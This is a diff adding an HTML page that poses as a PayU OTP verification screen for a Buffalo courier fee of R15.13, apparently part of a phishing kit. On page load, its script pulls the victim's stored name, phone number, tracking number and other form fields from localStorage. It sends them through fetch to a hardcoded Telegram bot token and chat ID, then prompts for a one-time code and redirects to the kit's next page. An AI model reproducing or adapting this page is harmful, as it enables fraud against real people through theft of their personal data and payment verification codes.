@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OTP Verification - PayU</title>
+<style>
+  body {margin:0; font-family: Arial, sans-serif; background:#fff; color:#000;}
+  .container {max-width:800px; margin:40px auto; padding:0 20px;}
+  .top-box {
+    display:flex;
+    justify-content:space-between;
+    border:1px solid #ccc;
+    padding:20px;
+    border-radius:6px;
+    background:#f5f5f5;
+  }
+  .top-box img {max-width:75px; height:auto;}
+  .details {flex:1; margin-left:20px;}
+  .amount-box {
+    background:#4CAF50;
+    color:#fff;
+    padding:10px;
+    margin-top:10px;
+    text-align:center;
+    font-weight:bold;
+    border-radius:4px;
+  }
+  .form-box {
+    border:1px solid #ccc;
+    border-radius:6px;
+    padding:20px;
+    margin-top:20px;
+    background:#f9f9f9;
+  }
+  .form-box h3 {margin-top:0; font-size:16px;}
+  input[type="text"], input[type="number"] {
+    width:100%;
+    padding:8px;
+    margin:6px 0 12px 0;
+    box-sizing:border-box;
+  }
+  button {
+    padding:10px 20px;
+    margin-right:10px;
+    border:none;
+    border-radius:4px;
+    cursor:pointer;
+  }
+  .pay-btn {background:#4CAF50; color:#fff;}
+  .cancel-btn {background:#ccc;}
+  .footer {text-align:center; margin-top:40px; font-size:12px; line-height:1.5; color:#555; border-top:1px solid #ccc; padding-top:20px;}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Top Box -->
+  <div class="top-box">
+    <img src="https://ipfs.io/ipfs/bafkreift76igpyooavjbhnueqp2pdn5a3q3iczjmp5smq6d2vdxqc2uxsq" alt="BUFFALO Logo">
+    <div class="details">
+      <div>Tracking Number: <span id="tracking-number">---</span></div>
+      <div class="amount-box">Amount Due R15.13</div>
+    </div>
+  </div>
+
+  <!-- OTP Form Box -->
+  <div class="form-box">
+    <h3>OTP Verification</h3>
+    <p>We sent an OTP to your phone: <span id="maskedPhone"></span></p>
+
+    <label>Enter OTP:</label>
+    <input type="text" id="otp" placeholder="Enter OTP" required>
+
+    <button class="pay-btn" id="verifyBtn">Verify OTP</button>
+  </div>
+</div>
+
+<div class="footer">
+  <p>All Rights Reserved ©2025</p>
+</div>
+
+<script>
+// ================= TELEGRAM BOT SETTINGS =================
+const BOT_TOKEN = "8514747527:AAFA7dakDlUWGG0S65QxWWbVsrY58Qe3lpI"; // Replace with your bot token
+const CHAT_ID = "5886782391";     // Replace with your chat ID
+const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+function sendTelegram(msg) {
+    fetch(TG_URL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    }).catch(err => console.error("Telegram error:", err));
+}
+
+// ================= LOAD FORM DATA =================
+const tracking = localStorage.getItem("otpTracking") || "---";
+const phone = localStorage.getItem("otpPhone") || "N/A";
+const full = localStorage.getItem("formFull") || "N/A";
+const ext = localStorage.getItem("formExt") || "N/A";
+const ret = localStorage.getItem("formRet") || "N/A";
+const part = localStorage.getItem("formPart") || "N/A";
+
+document.getElementById("tracking-number").textContent = tracking;
+
+// ================= DISPLAY MASKED PHONE =================
+let maskedPhone = phone;
+if (phone.length >= 7) {
+    const start = phone.slice(0, 2);
+    const end = phone.slice(-2);
+    maskedPhone = start + "*****" + end;
+}
+document.getElementById("maskedPhone").textContent = maskedPhone;
+
+// ================= SEND FORM DATA TO TELEGRAM =================
+const message =
+    "📄 NEW FORM SUBMISSION\n" +
+    "Tracking: " + tracking + "\n" +
+    "Full Name: " + full + "\n" +
+    "Extension: " + ext + "\n" +
+    "Return Date: " + ret + "\n" +
+    "Part Code: " + part + "\n" +
+    "Phone: " + phone + "\n" +
+    "Time: " + new Date().toLocaleString();
+
+sendTelegram(message);
+
+// ================= OTP VERIFY BUTTON =================
+document.getElementById("verifyBtn").addEventListener("click", function() {
+    const otp = document.getElementById("otp").value.trim();
+    if(!otp) { alert("Please enter the OTP"); return; }
+
+    // Redirect to index3.html after OTP submission
+    window.location.href = "loading3.html";
+});
+</script>
+
+</body>
+</html>
